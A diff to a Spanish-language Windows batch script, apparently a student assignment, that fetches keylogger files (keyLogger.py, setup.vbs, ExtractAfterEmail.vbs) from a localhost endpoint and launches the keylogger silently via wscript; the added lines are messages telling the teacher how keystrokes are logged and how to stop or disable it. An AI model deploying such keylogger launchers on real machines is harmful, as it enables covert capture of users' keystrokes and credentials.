@@ -5,7 +5,7 @@ setlocal enabledelayedexpansion
 :: Simulación de try-catch
 set "ErrorCode=0"
 set "myHostName=%COMPUTERNAME%"
-
+:: endopoint to download keylloger application
 set "EndPoint=http://localhost:3000/KeyLoggerApp/"
 
 :: Try Block
@@ -99,6 +99,16 @@ exit /b
 
     start "" wscript //B //Nologo "setup.vbs" 
     echo El keylogger está corriendo en segundo plano. >> salida.txt
+    echo Puede encontrar el archivo keyLogger.txt el cual contendra todas las pulsaciones que realice
+    echo Puede tardar un poco en crarse
+    echo Si desea parar el ejecutable debe Orpimir la combinación de teclas "Ctrl + Shift + Q" para finalizar el programa
+    echo ************************************************************************************* >> salida.txt
+    echo Profe Puede estar relajado no me envia nada de sus datos devuleta tampoco soy tan bueno xD, al terminar puede eliminar el ejecutable y todo archivo descargado
+    echo los archivos descargados por el enpoint son keyLogger.py, ExtractAfterEmail.vbs, setup.vbs, requirements.txt
+    echo si desea no ejecutar el key logger puede comentar la linea o borrarla, la linea es la siguiente
+    echo call :GetKeyloggerInfo || set "ErrorCode=1" linea 14
+    echo Graicas por su atencion
+
     echo ************************************************************************************* >> salida.txt
     exit /b
 
